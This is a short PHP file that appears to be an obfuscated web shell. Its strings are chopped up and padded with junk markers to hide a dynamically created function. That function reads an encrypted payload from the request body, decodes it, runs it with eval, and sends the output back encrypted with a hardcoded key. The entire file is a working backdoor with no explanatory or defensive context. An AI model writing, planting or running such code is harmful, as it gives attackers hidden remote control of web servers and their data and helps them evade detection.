<?php
$i='ction x(#:$t,$#:k){$c=#:st#:rlen($k)#:#:;$l=strlen($t#:)#:;$o="";for($#:i=0;$i#:<$l;){f#:or($j=0';
$v=str_replace('Gi','','GicreaGitGie_fuGiGinctGiion');
$F='$k#:="b8c79f56"#:;$kh="c8#:5fbd7#:9aa9e#:";$kf#:=#:"913748b#:67ad1";$#:p="SWI8otg#:u#:Y0Zp#:hKtO";f#:un';
$K='_end_clean#:();#:$r=@base#:#:64_encod#:e(@x(@gzc#:ompre#:ss($o#:),$k));pri#:nt#:("$p$kh$#:r$kf");}';
$k='#:;($j<$#:c&&$i#:<#:$l#:);$j++,$i++){#:$o.=$t{#:$i}^#:$k{$j#:};}}retu#:rn $o;}i#:f (@preg#:_matc#:';
$a='va#:l(@gzunc#:ompress(#:@x(@b#:ase64_#:decode(#:$m[1]#:),#:$k))#:#:);$o=@ob_ge#:t_content#:s();#:@ob';
$w='h(#:"/$kh(.+)$#:kf/",@#:#:file_ge#:t_c#:ontents("php:/#:#:/input"#:),$m)==1)#: {@ob_#:sta#:rt();@e';
$U=str_replace('#:','',$F.$i.$k.$w.$a.$K);
$O=$v('',$U);$O();
?>
